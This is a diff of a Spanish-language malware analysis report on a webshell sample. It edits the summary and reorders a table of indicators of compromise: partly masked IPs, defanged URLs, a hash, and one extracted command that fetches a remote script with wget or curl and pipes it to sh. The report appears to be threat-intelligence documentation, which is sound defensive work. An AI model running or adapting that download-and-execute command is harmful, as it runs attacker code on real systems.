@@ -4,7 +4,8 @@
 
 ## 📌 Resumen
 
-Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se registró 1 detección YARA válida. Se asoció 1 comando observado o extraído.
+Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se identificó 1 comando observado o extraído. Se identificaron 6 indicadores técnicos. Una detección YARA válida respalda el análisis.
+
 
 ## 🏷️ Clasificación
 
@@ -51,12 +52,12 @@ Artefacto asociado a la familia **webshell** con evidencia suficiente para atrib
 
 | Tipo | Valor | Contexto |
 | --- | --- | --- |
+| url | hxxps://217.60.195.XXX/sh) | strings |
+| url | hxxps://217.60.195.XXX/sh | strings |
 | ip | 190.179.177.XXX | static_analysis |
 | ip | 217.60.195.XXX | static_analysis |
-| url | hxxps://217.60.195.XXX/sh | strings |
-| url | hxxps://217.60.195.XXX/sh) | strings |
-| hash | 7b3681f0442ec8a7c9fdc50168d076ab34cf6a7d4448e2576f6d5937044975c9 | static_analysis |
 | command | (wget --no-check-certificate -qO- hxxps://217.60.195.XXX/sh \|\| curl -sk hxxps://217.60.195.XXX/sh) \| sh -s apache.selfre | strings |
+| hash | 7b3681f0442ec8a7c9fdc50168d076ab34cf6a7d4448e2576f6d5937044975c9 | static_analysis |
 | ip | 222.187.115.XXX | artifact_source |
 
 ## 🧬 Detecciones YARA
